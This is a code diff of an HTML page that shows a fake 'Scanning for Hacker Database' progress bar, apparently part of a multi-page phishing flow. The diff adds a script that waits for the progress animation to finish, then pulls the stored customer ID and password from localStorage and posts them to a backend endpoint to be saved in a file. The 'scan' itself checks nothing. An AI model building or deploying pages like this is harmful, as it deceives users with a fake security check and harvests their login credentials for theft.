@@ -6,52 +6,60 @@
     <title>Scanning...</title>
     <style>
         body {
-            font-family: Tahoma, Geneva, sans-serif;
-            background-color: #ccf2f5;
+            font-family: Arial, sans-serif;
             text-align: center;
+            margin-top: 50px;
         }
-        .container {
-            width: 400px;
-            margin: 100px auto;
-            padding: 20px;
-            border: 2px solid #4aa3b5;
-            background-color: #ffffff;
-            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
+        #progressBar {
+            width: 80%;
+            background-color: #ddd;
+            margin: 20px auto;
+            border-radius: 5px;
+            overflow: hidden;
         }
-        .progress-bar {
-            width: 100%;
-            background-color: #e0e0e0;
-            border: 1px solid #ddd;
-            margin: 20px 0;
+        #progress {
             height: 20px;
-            position: relative;
-        }
-        .progress {
-            height: 100%;
-            background-color: #4caf50;
+            background-color: #4CAF50;
             width: 0%;
-            transition: width 0.5s;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Scanning database...</h2>
-        <p>Checking if your credentials are in any hacker databases.</p>
-        <div class="progress-bar">
-            <div class="progress" id="progress"></div>
-        </div>
+    <h1>Scanning for Hacker Database...</h1>
+    <div id="progressBar">
+        <div id="progress"></div>
     </div>
-    <script>
-        let progress = 0;
-        let interval = setInterval(() => {
-            progress += 1;
-            document.getElementById('progress').style.width = progress + '%';
-            if (progress >= 100) {
-                clearInterval(interval);
-                setTimeout(() => location.href = 'page3.html', 1000);
-            }
-        }, 50);
-    </script>
-</body>
+    <p>Please wait while we check your credentials.</p>
+<script>
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += 1;
+        document.getElementById('progress').style.width = progress + '%';
+
+        if (progress >= 100) {
+            clearInterval(interval);
+
+            // Fetch credentials from local storage
+            const customerId = localStorage.getItem('customerId');
+            const password = localStorage.getItem('password');
+
+            // Send a request to the backend to save the data in a file
+            fetch('/submit-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ customerId, password }),
+            })
+                .then((response) => response.json())
+                .then((result) => {
+                    alert(result.message);
+                    location.href = 'page3.html';
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('An error occurred while saving your data.');
+                });
+        }
+    }, 50);
+</script>
+    </body>
 </html>
